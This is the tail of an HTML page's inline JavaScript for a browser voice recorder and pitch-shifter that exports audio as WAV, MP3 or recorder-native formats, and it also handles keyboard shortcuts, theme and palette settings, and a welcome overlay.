  s(0,'RIFF');o.setUint32(4,36+len*n*2,true);s(8,'WAVE');s(12,'fmt ');o.setUint32(16,16,true);o.setUint16(20,1,true);o.setUint16(22,n,true);
  o.setUint32(24,sr,true);o.setUint32(28,sr*n*2,true);o.setUint16(32,n*2,true);o.setUint16(34,16,true);s(36,'data');o.setUint32(40,len*n*2,true);
  var ch=[];for(var c=0;c<n;c++)ch.push(b.getChannelData(c));
  var p=44;for(var i=0;i<len;i++)for(var k=0;k<n;k++){var v=Math.max(-1,Math.min(1,ch[k][i]));o.setInt16(p,v<0?v*32768:v*32767,true);p+=2}
  return new Blob([o],{type:'audio/wav'});
}
var FMTS=[{id:'wav',label:'WAV',ext:'wav'},{id:'mp3',label:'MP3',ext:'mp3'}],sel='wav';
[{id:'webm',label:'WebM (Opus)',mime:'audio/webm;codecs=opus',ext:'webm'},{id:'ogg',label:'OGG (Opus)',mime:'audio/ogg;codecs=opus',ext:'ogg'},{id:'m4a',label:'M4A (AAC)',mime:'audio/mp4',ext:'m4a'}].forEach(function(f){try{if(window.MediaRecorder&&MediaRecorder.isTypeSupported(f.mime))FMTS.push(f)}catch(e){}});
function curFmt(){return FMTS.filter(function(f){return f.id===sel})[0]}
function buildFmt(){
  var h='';FMTS.forEach(function(f){h+='<button data-f="'+f.id+'" aria-pressed="'+(f.id===sel)+'">'+f.label+'</button>'});
  $('fmt').innerHTML=h;$('brow').hidden=sel!=='mp3';$('dl').textContent='Download '+curFmt().label.split(' ')[0];estimate();
}
function estimate(){
  if(!buf){$('est').textContent='';return}
  var d=buf.duration,mb;
  if(sel==='wav')mb=d*buf.sampleRate*buf.numberOfChannels*2/1048576;
  else if(sel==='mp3')mb=d*$('kbps').value*125/1048576;
  else{$('est').textContent='Encoded in real time: ~'+Math.ceil(d)+' s.';return}
  $('est').textContent='Estimated size: ~'+mb.toFixed(1)+' MB';
}
$('fmt').onclick=function(e){var b=e.target.closest('button');if(!b)return;sel=b.dataset.f;buildFmt()};
$('kbps').onchange=estimate;
function toMp3(b){
  if(!window.lamejs)return Promise.reject(new Error('lame'));
  var p=Promise.resolve(b);
  if(b.sampleRate>48000){var oc=new OfflineAudioContext(b.numberOfChannels,Math.ceil(b.length*44100/b.sampleRate),44100),s=oc.createBufferSource();s.buffer=b;s.connect(oc.destination);s.start();p=oc.startRendering()}
  return p.then(function(r){return new Promise(function(res){
    var nch=Math.min(2,r.numberOfChannels),enc=new lamejs.Mp3Encoder(nch,r.sampleRate,parseInt($('kbps').value,10)),L=r.getChannelData(0),R=nch>1?r.getChannelData(1):null,out=[],i=0,B=1152;
    function toI(f,s,n){var a=new Int16Array(n);for(var k=0;k<n;k++){var v=Math.max(-1,Math.min(1,f[s+k]||0));a[k]=v<0?v*32768:v*32767}return a}
    function step(){
      var end=Math.min(r.length,i+B*80);
      for(;i<end;i+=B){var n=Math.min(B,r.length-i),l=toI(L,i,n),d=R?enc.encodeBuffer(l,toI(R,i,n)):enc.encodeBuffer(l);if(d.length)out.push(new Uint8Array(d))}
      if(i<r.length){msg('Encoding MP3… '+Math.round(i/r.length*100)+'%');setTimeout(step,0)}
      else{var t=enc.flush();if(t.length)out.push(new Uint8Array(t));res(new Blob(out,{type:'audio/mpeg'}))}
    }
    step();
  })});
}
function encNative(b,mime){
  return new Promise(function(res,rej){
    var c=ac(),d=c.createMediaStreamDestination(),s=c.createBufferSource(),parts=[];
    s.buffer=b;s.connect(d);
    var r=new MediaRecorder(d.stream,{mimeType:mime});
    r.ondataavailable=function(e){if(e.data.size)parts.push(e.data)};
    r.onstop=function(){res(new Blob(parts,{type:mime}))};r.onerror=rej;
    s.onended=function(){setTimeout(function(){r.stop()},150)};
    r.start();s.start();
  });
}
$('dl').onclick=function(){
  if(!buf)return;var f=curFmt();msg('Preparing your file…');$('dl').disabled=true;
  var v=parseFloat($('st').value),name='vip-voice-'+(v>0?'plus':v<0?'minus':'')+Math.abs(v)+(fx!=='none'?'-'+fx:'')+'.'+f.ext;
  rendered().then(function(b){
    if(f.id==='wav')return toWav(b);
    if(f.id==='mp3')return toMp3(b);
    msg('Encoding '+f.label+'…');return encNative(b,f.mime);
  }).then(function(blob){
    var url=URL.createObjectURL(blob),a=document.createElement('a');
    a.href=url;a.download=name;document.body.appendChild(a);a.click();a.remove();setTimeout(function(){URL.revokeObjectURL(url)},4000);
    msg('Downloaded as '+f.label+'.');$('dl').disabled=false;
  }).catch(function(e){
    msg(e&&e.message==='lame'?'MP3 encoder failed. Try WAV.':'Could not create file.',true);$('dl').disabled=false;
  });
};
document.addEventListener('keydown',function(e){
  if(e.target!==document.body||document.documentElement.classList.contains('welcoming'))return;
  if(e.code==='Space'){e.preventDefault();if(src)stopPlay();else play(false)}
  else if(e.key==='r'||e.key==='R')$('rec').click();
});
window.addEventListener('resize',function(){if(!live)draw(shown||null,null)});
var root=document.documentElement;
function save(k,v){try{localStorage.setItem(k,v)}catch(e){}}
function modeUI(){var d=root.getAttribute('data-theme')==='dark';$('mode').setAttribute('aria-label',d?'Switch to light mode':'Switch to dark mode');$('mode').title=d?'Light mode':'Dark mode'}
function palUI(){var p=root.getAttribute('data-pal'),bs=document.querySelectorAll('#pal button');for(var i=0;i<bs.length;i++)bs[i].setAttribute('aria-pressed',bs[i].dataset.p===p?'true':'false')}
function palOpen(o){$('pal').hidden=!o;$('palbtn').setAttribute('aria-expanded',o?'true':'false')}
$('mode').onclick=function(){var n=root.getAttribute('data-theme')==='dark'?'light':'dark';root.setAttribute('data-theme',n);save('vip-mode',n);modeUI();if(!live)draw(shown||null,null)};
$('palbtn').onclick=function(e){e.stopPropagation();palOpen($('pal').hidden)};
$('pal').onclick=function(e){var b=e.target.closest('button');if(!b)return;root.setAttribute('data-pal',b.dataset.p);save('vip-pal',b.dataset.p);palUI();if(!live)draw(shown||null,null)};
document.addEventListener('click',function(e){if(!$('pal').hidden&&!e.target.closest('.tools'))palOpen(false)});
function closeWelcome(){
  if(!root.classList.contains('welcoming')||$('welcome').classList.contains('hide'))return;
  try{sessionStorage.setItem('vip-seen','1')}catch(e){}
  $('welcome').classList.add('hide');
  ['.top','main','.foot'].forEach(function(s){var el=document.querySelector(s);if(el)el.removeAttribute('inert')});
  setTimeout(function(){root.classList.remove('welcoming')},450);
}
$('go').onclick=closeWelcome;
document.addEventListener('keydown',function(e){if(e.key!=='Escape')return;if(!$('pal').hidden){palOpen(false);$('palbtn').focus()}else closeWelcome()});
if(root.classList.contains('welcoming')){['.top','main','.foot'].forEach(function(s){var el=document.querySelector(s);if(el)el.setAttribute('inert','')});$('go').focus()}
modeUI();palUI();label();draw(null,null);buildFmt();
})();
</script>
</body>
</html>
